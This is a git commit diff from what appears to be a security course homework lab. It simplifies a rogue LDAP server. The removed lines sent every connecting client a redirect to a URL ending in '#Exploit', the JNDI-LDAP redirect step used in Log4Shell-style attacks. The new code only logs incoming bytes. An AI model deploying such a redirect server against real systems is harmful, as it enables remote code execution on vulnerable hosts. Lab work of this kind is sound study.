ac578ba97a1960bdf37562f80bf3ed4be48bb393
kr3kls <kr3kls@gmail.com>
2025-05-24 07:43:31 -0400

    simplified ldap server

--- SEAS-8405/HW9/ldap_server/ldap_server.py
+++ SEAS-8405/HW9/ldap_server/ldap_server.py
@@ -1,32 +1,21 @@
 import socket
-import threading
 
-REDIRECT_URL = "http://localhost:8000/#Exploit"
+def main():
+    HOST = '172.17.0.1'
+    PORT = 1389
 
-def handle_client(client_socket):
-    data = client_socket.recv(1024)
-    print("[+] Received LDAP request")
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen(1)
+        print(f"[+] LDAP server listening on {HOST}:{PORT}")
 
-    response = REDIRECT_URL.encode()
+        conn, addr = s.accept()
+        with conn:
+            print(f"[+] Accepted connection from {addr}")
+            data = conn.recv(1024)
+            print(f"[+] Received data: {data.hex()}")
 
-    client_socket.send(response)
-    client_socket.close()
-    print(f"[+] Sent redirect to {REDIRECT_URL}")
+            conn.close()
 
-def start_ldap_server():
-    bind_ip = "172.17.0.1"
-    bind_port = 1389
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((bind_ip, bind_port))
-    server.listen(5)
-    print(f"[+] LDAP server listening on {bind_ip}:{bind_port}")
-
-    while True:
-        client, addr = server.accept()
-        print(f"[+] Accepted connection from {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client,))
-        client_handler.start()
-
-if __name__ == "__main__":
-    start_ldap_server()
+if __name__ == '__main__':
+    main()
